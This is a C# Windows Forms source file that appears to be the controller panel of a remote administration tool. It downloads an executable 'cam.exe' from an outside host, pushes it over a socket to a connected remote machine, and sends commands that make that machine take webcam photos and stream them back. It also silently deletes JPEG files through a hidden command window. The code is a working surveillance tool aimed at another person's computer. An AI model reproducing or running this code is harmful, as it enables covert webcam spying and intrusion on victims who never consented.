using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Record : Form
    {
        public Socket socks;
        public string ipaddr;
        int jpgnum = 0;

        public Record()
        {
            InitializeComponent();
        }

        public void getCamnum()
        {
            label5.Text = "正在下载拍照组件";
            try
            {
                var url = "https://colafox.top/cam.html";
                var save = @"cam.exe";
                if (!File.Exists(save))
                {
                    label5.Text = ("文件不存在，开始下载...");
                    using (var web = new WebClient())
                    {
                        web.DownloadFile(url, save);
                    }
                    label5.Text = ("文件下载成功");
                }
                label5.Text = ("文件下载完成");
            }
            catch
            {
                label5.Text = ("下载失败！ 重新下载");
                getCamnum();
            }

            button4.Enabled = true;
            button1.Enabled = true;
        }
        private void Record_Load(object sender, EventArgs e)
        {
            label2.Text = ipaddr;
            button1.Enabled = false;
            button4.Enabled = false;
            Thread th = new Thread(getCamnum);
            th.Start();
        }

        public void shot(object number)
        {
            button1.Text = "正在发送";
            string num = number as string;
            string comm = "SC" + num;
            socks.Send(Encoding.UTF8.GetBytes(comm));

            pictureBox1.Image = null;
            jpgnum++;
            string filename = "c" + jpgnum.ToString() + ".jpg";

            try
            {
                button1.Text = "正在下载";

                FileStream fs = new FileStream(filename, FileMode.Create);
                byte[] data = new byte[8];
                socks.Receive(data, data.Length, SocketFlags.None);
                long contentLength = BitConverter.ToInt64(data, 0);
                int size = 0;

                while (size < contentLength)
                {
                    byte[] bits = new byte[128];
                    int r = socks.Receive(bits, bits.Length, SocketFlags.None);
                    if (r <= 0) break;
                    fs.Write(bits, 0, r);
                    size += r;
                }

                fs.Flush();
                fs.Close();

                button1.Text = "下载完成！";

                pictureBox1.Image = Image.FromFile(filename);

                button1.Text = "茄子";
            }
            catch (Exception es)
            {
                label5.Text = es.ToString();
            }


        }
        private void button1_Click(object sender, EventArgs e)
        {
            pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            if (int.Parse(textBox1.Text) > -1)
            {
                Thread thread = new Thread(new ParameterizedThreadStart(shot));
                shot(textBox1.Text);
            }


        }

        private void button4_Click(object sender, EventArgs e)
        {
            socks.Send(Encoding.UTF8.GetBytes("SF"));

            FileStream fs = new FileStream(@"cam.exe", FileMode.Open);
            long contentLength = fs.Length;
            socks.Send(BitConverter.GetBytes(contentLength));
            while (true)
            {
                //每次发送128字节               
                byte[] bits = new byte[128];
                int r = fs.Read(bits, 0, bits.Length);
                if (r <= 0) break;
                socks.Send(bits, r, SocketFlags.None);
            }
            fs.Position = 0;

            fs.Close();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            GC.Collect();

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + "del /f /s /q *.jpg";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
        }
    }
}
